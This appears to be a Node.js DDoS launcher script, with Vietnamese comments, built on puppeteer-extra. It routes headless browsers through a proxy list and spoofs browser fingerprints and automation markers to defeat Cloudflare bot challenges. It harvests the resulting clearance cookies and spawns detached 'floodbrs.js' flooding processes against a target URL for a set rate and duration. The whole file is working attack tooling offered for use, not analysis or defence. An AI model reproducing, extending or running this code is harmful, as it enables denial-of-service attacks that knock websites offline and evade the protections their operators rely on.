const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const async = require('async');
const { spawn, exec  } = require('child_process');

puppeteer.use(StealthPlugin());

const COOKIES_MAX_RETRIES = 3;
const COLORS = {
    RED: '\x1b[31m',
    PINK: '\x1b[35m',
    WHITE: '\x1b[37m',
    YELLOW: '\x1b[33m',
    GREEN: '\x1b[32m',
    RESET: '\x1b[0m'
};

// ========== AGGRESSIVE HUMAN SIMULATION BYPASS ==========
const bypassFirewall = async (page) => {
    await page.evaluateOnNewDocument(() => {
        // Remove all automation indicators
        delete navigator.__proto__.webdriver;
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        Object.defineProperty(navigator, 'plugins', { 
            get: () => [
                {0: {type: "application/x-google-chrome-pdf"}, name: "Chrome PDF Plugin", filename: "internal-pdf-viewer", description: "Portable Document Format"},
                {0: {type: "application/pdf"}, name: "Chrome PDF Viewer", filename: "mhjfbmdgcfjbbpaeojofohoefgiehjai", description: "Portable Document Format"}
            ] 
        });
        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        
        // Mock Chrome runtime completely
        window.chrome = { 
            runtime: {
                connect: () => ({onMessage: {addListener: () => {}}, postMessage: () => {}, onDisconnect: {addListener: () => {}}}),
                sendMessage: () => {},
                onMessage: {addListener: () => {}},
                onConnect: {addListener: () => {}},
                getManifest: () => ({})
            }, 
            loadTimes: () => ({
                finishDocumentLoadTime: 0,
                finishLoadTime: 0,
                firstPaintTime: 0,
                requestTime: 0,
                startLoadTime: 0,
                commitLoadTime: 0
            }), 
            csi: () => ({onloadT: 0, startE: 0, pageT: 0}), 
            app: {
                isInstalled: false,
                InstallState: {DISABLED: 'disabled', INSTALLED: 'installed', NOT_INSTALLED: 'not_installed'},
                RunningState: {CANNOT_RUN: 'cannot_run', READY_TO_RUN: 'ready_to_run', RUNNING: 'running'}
            },
            webstore: {
                onInstallStageChanged: {addListener: () => {}},
                onDownloadProgress: {addListener: () => {}}
            }
        };
        
        // Override permissions API
        const originalQuery = window.navigator.permissions.query;
        window.navigator.permissions.query = (parameters) => (
            parameters.name === 'notifications' ?
                Promise.resolve({ state: Notification.permission }) :
                originalQuery(parameters)
        );

        // Advanced audio context spoofing
        const originalCreateOscillator = AudioContext.prototype.createOscillator;
        AudioContext.prototype.createOscillator = function() {
            const oscillator = originalCreateOscillator.apply(this, arguments);
            const originalFrequency = oscillator.frequency;
            Object.defineProperty(oscillator.frequency, 'value', {
                get: () => originalFrequency.value,
                set: (value) => { originalFrequency.value = value + (Math.random() * 0.1 - 0.05); }
            });
            return oscillator;
        };

        // Advanced WebGL spoofing
        const getParameter = WebGLRenderingContext.prototype.getParameter;
        WebGLRenderingContext.prototype.getParameter = function(parameter) {
            if (parameter === 37445) return 'Intel Inc.';
            if (parameter === 37446) return 'Intel Iris OpenGL Engine';
            if (parameter === 34076) return 'Google Inc. (Google)';
            if (parameter === 34077) return 'ANGLE (Google, Vulkan 1.3.0 (SwiftShader Device (Subzero) (0x0000C0DE)), SwiftShader driver)';
            return getParameter.apply(this, arguments);
        };

        // Remove all headless detection patterns
        Object.defineProperty(navigator, 'hardwareConcurrency', { value: 8 });
        Object.defineProperty(navigator, 'deviceMemory', { value: 8 });
        Object.defineProperty(navigator, 'maxTouchPoints', { value: 5 });
        
        Object.defineProperty(document, 'hidden', { value: false, configurable: true });
        Object.defineProperty(document, 'visibilityState', { value: 'visible', configurable: true });
        Object.defineProperty(document, 'webkitVisibilityState', { value: 'visible', configurable: true });
        
        // Spoof timezone and locale
        Object.defineProperty(Intl, 'DateTimeFormat', {
            value: class extends Intl.DateTimeFormat {
                constructor(locales, options) {
                    if (options && options.timeZone) {
                        return super(locales, { ...options, timeZone: 'America/New_York' });
                    }
                    return super(locales, options);
                }
            }
        });

        // Remove automation properties from window
        delete window.__webdriver_evaluate;
        delete window.__selenium_evaluate;
        delete window.__webdriver_script_function;
        delete window.__webdriver_script_func;
        delete window.__webdriver_script_fn;
        delete window._Selenium_IDE_Recorder;
        delete window._selenium;
        delete window.callPhantom;
        delete window.callSelenium;
        delete window.phantom;
        delete window.webdriver;
        delete window.selenium;
        delete window._phantom;

        // Spoof performance metrics
        Object.defineProperty(performance, 'memory', {
            value: {
                jsHeapSizeLimit: 4294705152,
                totalJSHeapSize: 23200000,
                usedJSHeapSize: 18200000
            }
        });
    });
};

const getFirewallBypassArgs = () => [
    '--disable-background-timer-throttling',
    '--disable-backgrounding-occluded-windows',
    '--disable-breakpad',
    '--disable-component-extensions-with-background-pages',
    '--disable-dev-shm-usage',
    '--disable-extensions',
    '--disable-features=TranslateUI,BlinkGenPropertyTrees',
    '--disable-ipc-flooding-protection',
    '--disable-renderer-backgrounding',
    '--disable-site-isolation-trials',
    '--enable-features=NetworkService,NetworkServiceInProcess',
    '--hide-scrollbars',
    '--no-default-browser-check',
    '--no-first-run',
    '--disable-default-apps',
    '--disable-translate',
    '--disable-web-security',
    '--disable-xss-auditor',
    '--no-pings',
    '--use-gl=swiftshader',
    '--disable-software-rasterizer',
    '--disable-background-networking',
    '--disable-client-side-phishing-detection',
    '--disable-sync',
    '--disable-hang-monitor',
    '--disable-prompt-on-repost',
    '--disable-domain-reliability',
    '--disable-component-update',
    '--aggressive-cache-discard',
    '--max_old_space_size=4096',
    '--disable-2d-canvas-clip-aa',
    '--disable-2d-canvas-image-chromium',
    '--disable-3d-apis',
    '--disable-accelerated-2d-canvas',
    '--disable-accelerated-jpeg-decoding',
    '--disable-accelerated-mjpeg-decode',
    '--disable-app-list-dismiss-on-blur',
    '--disable-accelerated-video-decode',
    '--disable-browser-side-navigation',
    '--disable-databases',
    '--disable-es3-apis',
    '--disable-es3-gl-context',
    '--disable-file-system',
    '--disable-gpu-compositing',
    '--disable-local-storage',
    '--disable-logging',
    '--disable-notifications',
    '--disable-offer-store-unmasked-wallet-cards',
    '--disable-offer-upload-credit-cards',
    '--disable-pepper-3d',
    '--disable-reading-from-canvas',
    '--disable-remote-fonts',
    '--disable-speech-api',
    '--disable-threaded-animation',
    '--disable-threaded-scrolling',
    '--disable-web-gl',
    '--disable-webgl',
    '--disable-webgl2',
    '--enable-aggressive-domstorage-flushing',
    '--enable-unsafe-swiftshader',
    '--ignore-gpu-blacklist',
    '--metrics-recording-only',
    '--mute-audio',
    '--password-store=basic',
    '--use-mock-keychain',
    '--no-zygote',
    '--single-process'
];

// AGGRESSIVE CHALLENGE SOLVING
const solveAdvancedChallenge = async (page, browserProxy) => {
    try {
        // Extended initial wait
        await page.waitForTimeout(5000 + Math.random() * 3000);
        
        const currentUrl = page.url();
        const title = await page.title();
        const content = await page.content();

        // Check for challenge presence
        const isChallenge = title.includes('Just a moment') || 
                           title.includes('Checking your browser') ||
                           content.includes('challenge-platform') ||
                           content.includes('cf-browser-verification') ||
                           currentUrl.includes('challenges.cloudflare.com') ||
                           content.includes('Enable JavaScript and cookies to continue');

        if (!isChallenge) {
            return true; // No challenge detected
        }

        coloredLog(COLORS.WHITE, `[INFO] Detected challenge, solving for proxy: ${maskProxy(browserProxy)}`);

        // STRATEGY 1: Wait for auto-solve (most common)
        try {
            await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 25000 });
            coloredLog(COLORS.GREEN, `[INFO] Challenge auto-solved for proxy: ${maskProxy(browserProxy)}`);
            return true;
        } catch (e) {}

        // STRATEGY 2: Interactive element click
        const clickSelectors = [
            'input[type="submit"]',
            'button',
            '.btn',
            '#challenge-submit',
            '[type="submit"]',
            'input[value="Submit"]',
            'a[href*="challenge"]',
            '.cf-btn',
            '.success',
            '#success'
        ];

        for (const selector of clickSelectors) {
            try {
                const element = await page.$(selector);
                if (element) {
                    await element.click();
                    await page.waitForTimeout(3000);
                    try {
                        await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 10000 });
                        coloredLog(COLORS.GREEN, `[INFO] Challenge solved via click (${selector}) for proxy: ${maskProxy(browserProxy)}`);
                        return true;
                    } catch (e) {}
                }
            } catch (e) {}
        }

        // STRATEGY 3: Advanced human simulation
        await page.waitForTimeout(2000);
        
        // Complex mouse movements
        const viewport = page.viewport();
        for (let i = 0; i < 5; i++) {
            const x = Math.random() * viewport.width * 0.8 + viewport.width * 0.1;
            const y = Math.random() * viewport.height * 0.8 + viewport.height * 0.1;
            await page.mouse.move(x, y, { steps: 20 + Math.floor(Math.random() * 10) });
            await page.waitForTimeout(500 + Math.random() * 500);
        }

        // Scroll behavior
        await page.evaluate(() => {
            window.scrollTo(0, 200 + Math.random() * 400);
        });
        await page.waitForTimeout(1000 + Math.random() * 1000);

        // STRATEGY 4: Form field interaction
        const inputSelectors = ['input[type="text"]', 'input[type="email"]', 'textarea', 'input[name="answer"]'];
        for (const selector of inputSelectors) {
            try {
                const input = await page.$(selector);
                if (input) {
                    await input.click({ delay: 50 + Math.random() * 100 });
                    await page.waitForTimeout(500);
                    await input.type('test', { delay: 80 + Math.random() * 120 });
                    await page.waitForTimeout(1000);
                    
                    // Look for submit button after filling
                    for (const submitSelector of clickSelectors) {
                        try {
                            const submit = await page.$(submitSelector);
                            if (submit) {
                                await submit.click();
                                await page.waitForTimeout(5000);
                                try {
                                    await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 15000 });
                                    coloredLog(COLORS.GREEN, `[INFO] Challenge solved via form (${selector}) for proxy: ${maskProxy(browserProxy)}`);
                                    return true;
                                } catch (e) {}
                            }
                        } catch (e) {}
                    }
                }
            } catch (e) {}
        }

        // STRATEGY 5: Iframe interaction
        try {
            const frameElement = await page.$('iframe[src*="challenge"]');
            if (frameElement) {
                const frame = await frameElement.contentFrame();
                if (frame) {
                    const frameButton = await frame.$('button, input[type="submit"]');
                    if (frameButton) {
                        await frameButton.click();
                        await page.waitForTimeout(8000);
                        try {
                            await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 15000 });
                            coloredLog(COLORS.GREEN, `[INFO] Challenge solved via iframe for proxy: ${maskProxy(browserProxy)}`);
                            return true;
                        } catch (e) {}
                    }
                }
            }
        } catch (e) {}

        // STRATEGY 6: Final attempt - refresh and retry
        await page.waitForTimeout(3000);
        await page.reload({ waitUntil: 'networkidle0' });
        await page.waitForTimeout(8000);

        // Check if challenge is gone after reload
        const newTitle = await page.title();
        if (!newTitle.includes('Just a moment') && !newTitle.includes('Checking your browser')) {
            coloredLog(COLORS.GREEN, `[INFO] Challenge solved after reload for proxy: ${maskProxy(browserProxy)}`);
            return true;
        }

        coloredLog(COLORS.RED, `[INFO] All challenge solving strategies failed for proxy: ${maskProxy(browserProxy)}`);
        return false;

    } catch (error) {
        coloredLog(COLORS.RED, `[INFO] Challenge solving error for proxy ${maskProxy(browserProxy)}: ${error.message}`);
        return false;
    }
};
// ========== END AGGRESSIVE HUMAN SIMULATION BYPASS ==========

// Command-line argument validation
if (process.argv.length < 6) {
    console.error('Usage: node browser.js <targetURL> <threads> <proxyFile> <rate> <time>');
    process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

let totalSolves = 0;

// Utility functions
const generateRandomString = (minLength, maxLength) => {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => 
        characters[Math.floor(Math.random() * characters.length)]
    ).join('');
};

const validKey = generateRandomString(5, 10);

const readProxies = (filePath) => {
    try {
        return fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
    } catch (error) {
        console.error('Error reading proxies file:', error.message);
        return [];
    }
};

const maskProxy = (proxy) => {
    const parts = proxy.split(':');
    if (parts.length >= 2 && parts[0].split('.').length === 4) {
        const ipParts = parts[0].split('.');
        return `${ipParts[0]}.${ipParts[1]}.**.**:****`;
    }
    return proxy;
};
process.on('SIGINT', () => {
    coloredLog(COLORS.YELLOW, '[INFO] Nhận tín hiệu Ctrl+C, đang kill processes...');
    
    exec('taskkill /f /im node.exe', (err) => {
        if (err && err.code !== 128) {
            coloredLog(COLORS.RED, `[INFO] Lỗi kill node.exe: ${err.message}`);
        } else {
            coloredLog(COLORS.GREEN, '[INFO] Đã kill node.exe processes');
        }
    });

    exec('taskkill /f /im msedge.exe', (err) => {
        if (err && err.code !== 128) {
            coloredLog(COLORS.RED, `[INFO] Lỗi kill msedge.exe: ${err.message}`);
        } else {
            coloredLog(COLORS.GREEN, '[INFO] Đã kill msedge.exe processes');
        }
    });

    setTimeout(() => {
        coloredLog(COLORS.GREEN, '[INFO] Exiting...');
        process.exit(0);
    }, 3000);
});
const coloredLog = (color, text) => {
    console.log(`${color}${text}${COLORS.RESET}`);
};

const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));

const randomElement = (array) => array[Math.floor(Math.random() * array.length)];

// User agents for mobile devices
const userAgents = [
    // Samsung
    `Mozilla/5.0 (Linux; Android 12; SM-S928U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36`,
    `Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36`,
    // Xiaomi
    `Mozilla/5.0 (Linux; Android 14; 23127PN0CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36`,
    // ASUS ROG
    `Mozilla/5.0 (Linux; Android 13; ASUS_AI2401) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36`,
    // OnePlus
    `Mozilla/5.0 (Linux; Android 14; CPH2551) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36`,
    // Google Pixel
    `Mozilla/5.0 (Linux; Android 13; GPJ41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36`,
    // iPhone
    `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1`
];

// Human-like interaction simulations
const simulateHumanMouseMovement = async (page, element, options = {}) => {
    const { 
        minMoves = 5, 
        maxMoves = 10, 
        minDelay = 50, 
        maxDelay = 150, 
        jitterFactor = 0.1, 
        overshootChance = 0.2, 
        hesitationChance = 0.1, 
        finalDelay = 500 
    } = options;

    const bbox = await element.boundingBox();
    if (!bbox) throw new Error('Element not visible');

    const targetX = bbox.x + bbox.width / 2;
    const targetY = bbox.y + bbox.height / 2;

    const pageDimensions = await page.evaluate(() => ({
        width: window.innerWidth,
        height: window.innerHeight
    }));

    let currentX = Math.random() * pageDimensions.width;
    let currentY = Math.random() * pageDimensions.height;

    const moves = Math.floor(Math.random() * (maxMoves - minMoves + 1)) + minMoves;

    for (let i = 0; i < moves; i++) {
        const progress = i / (moves - 1);
        let nextX = currentX + (targetX - currentX) * progress;
        let nextY = currentY + (targetY - currentY) * progress;

        nextX += (Math.random() * 2 - 1) * jitterFactor * bbox.width;
        nextY += (Math.random() * 2 - 1) * jitterFactor * bbox.height;

        if (Math.random() < overshootChance && i < moves - 1) {
            nextX += (Math.random() * 0.5 + 0.5) * (nextX - currentX);
            nextY += (Math.random() * 0.5 + 0.5) * (nextY - currentY);
        }

        await page.mouse.move(nextX, nextY, { steps: 10 });
        await sleep((Math.random() * (maxDelay - minDelay) + minDelay) / 1000);

        if (Math.random() < hesitationChance) {
            await sleep((Math.random() * (maxDelay - minDelay) + minDelay) * 3 / 1000);
        }

        currentX = nextX;
        currentY = nextY;
    }

    await page.mouse.move(targetX, targetY, { steps: 5 });
    await sleep(finalDelay / 1000);
};

const simulateHumanTyping = async (page, element, text, options = {}) => {
    const { 
        minDelay = 30, 
        maxDelay = 100, 
        mistakeChance = 0.05, 
        pauseChance = 0.02 
    } = options;

    await simulateHumanMouseMovement(page, element);
    await element.click();
    await element.evaluate(el => el.value = '');

    for (const char of text) {
        await sleep((Math.random() * (maxDelay - minDelay) + minDelay) / 1000);

        if (Math.random() < mistakeChance) {
            const randomChar = String.fromCharCode(97 + Math.floor(Math.random() * 26));
            await page.keyboard.press(randomChar);
            await sleep((Math.random() * (maxDelay - minDelay) + minDelay) * 2 / 1000);
            await page.keyboard.press('Backspace');
            await sleep((Math.random() * (maxDelay - minDelay) + minDelay) / 1000);
        }

        await page.keyboard.press(char);

        if (Math.random() < pauseChance) {
            await sleep((Math.random() * (maxDelay - minDelay) + minDelay) * 10 / 1000);
        }
    }
};

const simulateHumanScrolling = async (page, distance, options = {}) => {
    const { 
        minSteps = 5, 
        maxSteps = 15, 
        minDelay = 50, 
        maxDelay = 200, 
        direction = 'down', 
        pauseChance = 0.2, 
        jitterFactor = 0.1 
    } = options;

    const directionMultiplier = direction === 'up' ? -1 : 1;
    const steps = Math.floor(Math.random() * (maxSteps - minSteps + 1)) + minSteps;
    const baseStepSize = distance / steps;
    let totalScrolled = 0;

    for (let i = 0; i < steps; i++) {
        const jitter = baseStepSize * jitterFactor * (Math.random() * 2 - 1);
        let stepSize = Math.round(baseStepSize + jitter);

        if (i === steps - 1) {
            stepSize = (distance - totalScrolled) * directionMultiplier;
        } else {
            stepSize *= directionMultiplier;
        }

        await page.evaluate(scrollAmount => window.scrollBy(0, scrollAmount), stepSize);
        totalScrolled += stepSize * directionMultiplier;

        await sleep((Math.random() * (maxDelay - minDelay) + minDelay) / 1000);

        if (Math.random() < pauseChance) {
            await sleep((Math.random() * (maxDelay - minDelay) + minDelay) * 6 / 1000);
        }
    }
};

const simulateNaturalPageBehavior = async (page) => {
    const dimensions = await page.evaluate(() => ({
        width: document.documentElement.clientWidth,
        height: document.documentElement.clientHeight,
        scrollHeight: document.documentElement.scrollHeight
    }));

    const scrollAmount = Math.floor(dimensions.scrollHeight * (0.2 + Math.random() * 0.6));
    await simulateHumanScrolling(page, scrollAmount, { minSteps: 8, maxSteps: 15, pauseChance: 0.3 });

    await sleep(1 + Math.random() * 3);

    const movementCount = 2 + Math.floor(Math.random() * 4);
    for (let i = 0; i < movementCount; i++) {
        const x = Math.floor(Math.random() * dimensions.width * 0.8) + dimensions.width * 0.1;
        const y = Math.floor(Math.random() * dimensions.height * 0.8) + dimensions.height * 0.1;
        await page.mouse.move(x, y, { steps: 10 + Math.floor(Math.random() * 20) });
        await sleep(0.5 + Math.random());
    }

    if (Math.random() > 0.5) {
        await simulateHumanScrolling(page, scrollAmount / 2, { direction: 'up', minSteps: 3, maxSteps: 8 });
    }
};

// Browser fingerprint spoofing
const spoofFingerprint = async (page) => {
    await page.evaluateOnNewDocument(() => {
        const screenWidth = 360 + Math.floor(Math.random() * 100);
        const screenHeight = 640 + Math.floor(Math.random() * 200);
        Object.defineProperty(window, 'screen', {
            value: {
                width: screenWidth,
                height: screenHeight,
                availWidth: screenWidth,
                availHeight: screenHeight,
                colorDepth: 24,
                pixelDepth: 24
            },
            writable: false
        });

        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        const originalToDataURL = canvas.toDataURL;
        canvas.toDataURL = function () {
            ctx.fillStyle = `#${Math.random().toString(16).slice(2, 8)}`;
            ctx.fillRect(0, 0, 10, 10);
            return originalToDataURL.apply(this, arguments);
        };

        Object.defineProperty(navigator, 'platform', { value: 'Linux aarch64', writable: false });
        Object.defineProperty(window, 'devicePixelRatio', { value: 2 + Math.random(), writable: false });
    });
};

// Enhanced challenge detection and handling
const detectChallenge = async (browser, page, browserProxy) => {
    try {
        const title = await page.title();
        const content = await page.content();

        if (title === 'Attention Required! | Cloudflare') {
            coloredLog(COLORS.RED, `[INFO] Proxy blocked: ${maskProxy(browserProxy)}`);
            throw new Error('Proxy blocked');
        }

        // Use aggressive challenge solver
        const challengeSolved = await solveAdvancedChallenge(page, browserProxy);
        
        if (!challengeSolved) {
            coloredLog(COLORS.RED, `[INFO] Challenge bypass failed for proxy: ${maskProxy(browserProxy)}`);
            throw new Error('Challenge bypass failed');
        }

        await sleep(3);
    } catch (error) {
        throw error;
    }
};

// Browser launch with retry logic
const launchBrowserWithRetry = async (targetURL, browserProxy, attempt = 1, maxRetries = 2) => {
    const userAgent = randomElement(userAgents);
    let browser;

    const options = {
        headless: true,
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--window-size=360,640',
            `--user-agent=${userAgent}`,
            '--disable-accelerated-2d-canvas',
            '--disable-gpu',
            '--disable-blink-features=AutomationControlled',
            '--disable-infobars',
            '--no-zygote',
            '--single-process',
            '--disable-background-timer-throttling',
            '--disable-renderer-backgrounding',
            '--enable-features=NetworkService,NetworkServiceInProcess',
            '--ignore-certificate-errors',
            '--ignore-ssl-errors',
            '--tls-min-version=1.2',
            '--tls-max-version=1.3',
            '--enable-touch-drag-drop',
            '--touch-events=enabled',
            '--emulate-touch-from-mouse',
            '--enable-viewport',
            '--enable-small-dedicated-cache',
            '--disable-popup-blocking',
            '--disable-component-extensions-with-background-pages',
            '--disable-webrtc-hw-decoding',
            '--disable-webrtc-hw-encoding',
            '--disable-media-session-api',
            '--disable-remote-fonts',
            '--force-color-profile=srgb',
            '--enable-quic',
            '--enable-features=PostQuantumKyber',
            // ========== AGGRESSIVE FIREWALL BYPASS ARGS ==========
            ...getFirewallBypassArgs()
        ],
        defaultViewport: {
            width: 360,
            height: 640,
            deviceScaleFactor: 3,
            isMobile: true,
            hasTouch: Math.random() < 0.5,
            isLandscape: false
        }
    };

    try {
        coloredLog(COLORS.YELLOW, `[INFO] Launching browser with proxy: ${maskProxy(browserProxy)}`);
        browser = await puppeteer.launch(options);
        const [page] = await browser.pages();
        const client = page._client();

        await spoofFingerprint(page);
        // ========== AGGRESSIVE FIREWALL BYPASS ==========
        await bypassFirewall(page);

        page.on('framenavigated', (frame) => {
            if (frame.url().includes('challenges.cloudflare.com')) {
                client.send('Target.detachFromTarget', { targetId: frame._id }).catch(() => {});
            }
        });

        page.setDefaultNavigationTimeout(90 * 1000);
        await page.goto(targetURL, { waitUntil: 'networkidle0', timeout: 90000 });

        const bodyHandle = await page.$('body');
        if (bodyHandle) {
            await simulateHumanMouseMovement(page, bodyHandle);
        }

        await simulateNaturalPageBehavior(page);
        await detectChallenge(browser, page, browserProxy);

        await sleep(3);

        const title = await page.title();
        const cookies = await page.cookies(targetURL);

        if (!cookies || cookies.length === 0) {
            coloredLog(COLORS.RED, `[INFO] No cookies found for proxy: ${maskProxy(browserProxy)}`);
            throw new Error('No cookies found');
        }

        const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ').trim();

        if (!cookieString) {
            coloredLog(COLORS.RED, `[INFO] Empty cookie string for proxy: ${maskProxy(browserProxy)}`);
            throw new Error('Empty cookie string');
        }

        coloredLog(COLORS.GREEN, `[INFO] Successfully got cookies for proxy: ${maskProxy(browserProxy)}`);
        totalSolves++;
        coloredLog(COLORS.GREEN, `[INFO] Total successful solves: ${totalSolves}`);

        await browser.close();
        return { title, browserProxy, cookies: cookieString, userAgent };
    } catch (error) {
        if (browser) await browser.close().catch(() => {});
        if (attempt < maxRetries) {
            await sleep(4);
            return launchBrowserWithRetry(targetURL, browserProxy, attempt + 1, maxRetries);
        }
        return null;
    }
};

// Thread handling - ĐÃ SỬA: Spawn liên tục như browser1.js
const startThread = async (targetURL, browserProxy, task, done, retries = 0) => {
    if (retries >= COOKIES_MAX_RETRIES) {
        done(null, { task, currentTask: queue.length() });
        return;
    }

    try {
        const response = await launchBrowserWithRetry(targetURL, browserProxy);
        if (response) {
            if (response.title === 'Just a moment...') {
                coloredLog(COLORS.RED, `[INFO] Captcha bypass failed for proxy: ${maskProxy(browserProxy)}`);
                await startThread(targetURL, browserProxy, task, done, retries + 1);
                return;
            }

            const cookieInfo = JSON.stringify({
                Page: response.title,
                Proxy: maskProxy(browserProxy),
                'User-agent': response.userAgent,
                cookie: response.cookies
            });
            console.log(cookieInfo);

            try {
                coloredLog(COLORS.YELLOW, `[DEBUG] Spawning floodbrs với proxy: ${maskProxy(browserProxy)}`);
                
                // SPAWN LIÊN TỤC NHƯ BROWSER1.JS
                const floodProcess = spawn('node', [
                    'floodbrs.js',
                    targetURL,
                    duration.toString(),
                    rate,
                    threads.toString(),
                    proxyFile,
                    response.cookies,
                    response.userAgent,
                    validKey
                ], {
                    detached: true,
                    stdio: 'ignore'
                });

                floodProcess.unref();
                
                coloredLog(COLORS.GREEN, `[INFO] Đã spawn floodbrs process cho proxy: ${maskProxy(browserProxy)}`);
                
            } catch (error) {
                coloredLog(COLORS.RED, `[INFO] Lỗi spawn floodbrs: ${error.message}`);
            }

            done(null, { task });
        } else {
            await startThread(targetURL, browserProxy, task, done, retries + 1);
        }
    } catch (error) {
        await startThread(targetURL, browserProxy, task, done, retries + 1);
    }
};

// Async queue setup
const queue = async.queue((task, done) => {
    startThread(targetURL, task.browserProxy, task, done);
}, threads);

queue.drain(() => {
    coloredLog(COLORS.GREEN, '[INFO] All proxies processed');
});

// Main execution
const main = async () => {
    const proxies = readProxies(proxyFile);
    if (proxies.length === 0) {
        coloredLog(COLORS.RED, '[INFO] No proxies found in file. Exiting.');
        process.exit(1);
    }

    coloredLog(COLORS.GREEN, `[INFO] Starting with ${proxies.length} proxies, ${threads} threads, for ${duration} seconds`);

    proxies.forEach(browserProxy => queue.push({ browserProxy }));

    coloredLog(COLORS.YELLOW, `[INFO] Will run for ${duration} seconds`);
    setTimeout(() => {
        coloredLog(COLORS.YELLOW, '[INFO] Time\'s up! Cleaning up...');
        queue.kill();

        exec('pkill -f floodbrs.js', (err) => {
            if (err && err.code !== 1) {
                console.error('Error killing floodbrs.js processes:', err.message);
            } else {
                coloredLog(COLORS.GREEN, '[INFO] Successfully killed floodbrs processes');
            }
        });

        exec('pkill -f chrome', (err) => {
            if (err && err.code !== 1) {
                console.error('Error killing Chrome processes:', err.message);
            } else {
                coloredLog(COLORS.GREEN, '[INFO] Successfully killed Chrome processes');
            }
        });

        setTimeout(() => {
            coloredLog(COLORS.GREEN, '[INFO] Exiting');
            process.exit(0);
        }, 5000);
    }, duration * 1000);
};

process.on('uncaughtException', (error) => console.log(error));
process.on('unhandledRejection', (error) => console.log(error));

coloredLog(COLORS.GREEN, '[INFO] Running...');
main().catch(err => {
    coloredLog(COLORS.RED, `[INFO] Main function error: ${err.message}`);
    process.exit(1);
});
